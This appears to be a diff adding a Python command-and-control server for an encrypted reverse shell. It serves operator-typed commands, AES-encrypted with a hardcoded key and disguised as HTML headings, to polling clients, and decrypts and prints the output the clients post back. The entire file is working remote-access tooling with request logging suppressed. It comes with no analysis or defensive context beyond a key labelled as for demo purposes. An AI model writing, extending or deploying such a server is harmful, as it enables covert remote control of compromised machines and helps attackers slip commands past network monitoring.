@@ -1,0 +1,66 @@
+import pyaes
+import base64
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from time import sleep
+from sys import stdin, argv
+key = b"This_key_for_demo_purposes_only!"
+def encrypt(data):
+    aes = pyaes.AESModeOfOperationCTR(key)
+    ciphertext = aes.encrypt(data)
+    return base64.b64encode(ciphertext).decode()
+def decrypt(data):
+    aes = pyaes.AESModeOfOperationCTR(key)
+    decoded_data = base64.b64decode(data)
+    return aes.decrypt(decoded_data).decode('utf-8')
+command_history = []
+class ShellServer(BaseHTTPRequestHandler):
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+    def do_GET(self):
+        self._set_headers()
+        try:
+            command = input('$ ')
+        except KeyboardInterrupt:
+            response = input('Quit? (y/n/r/c): ')
+            if response == 'y':
+                exit(0)
+            elif response == 'r':
+                print('Restarting server...')
+                return False
+            elif response == 'c':
+                print('Command history:')
+                for cmd in command_history:
+                    print(cmd)
+            else:
+                print('Waiting for reconnection...')
+                return
+        else:
+            command_history.append(command)
+            encrypted_command = encrypt(command)
+            content = f"<html><body><h1>{encrypted_command}</h1></body></html>".encode()
+            try:
+                self.wfile.write(content)
+            except BrokenPipeError:
+                print('Broken Pipe, waiting for reconnection...')
+    def do_POST(self):
+        self._set_headers()
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode()
+        post_data = post_data.strip('<html><body><h1>').strip('</h1></body></html>')
+        result = decrypt(post_data)
+        print(result)
+    def log_message(self, format, *args):
+        return
+def run(server_address=('0.0.0.0', 8880)):
+    httpd = HTTPServer(server_address, ShellServer)
+    print(f'Starting httpd on {server_address[0]}:{server_address[1]}...')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('Server is shutting down...')
+        httpd.server_close()
+if __name__ == "__main__":
+    port = int(argv[1]) if len(argv) == 2 else 8880
+    run(('0.0.0.0', port))
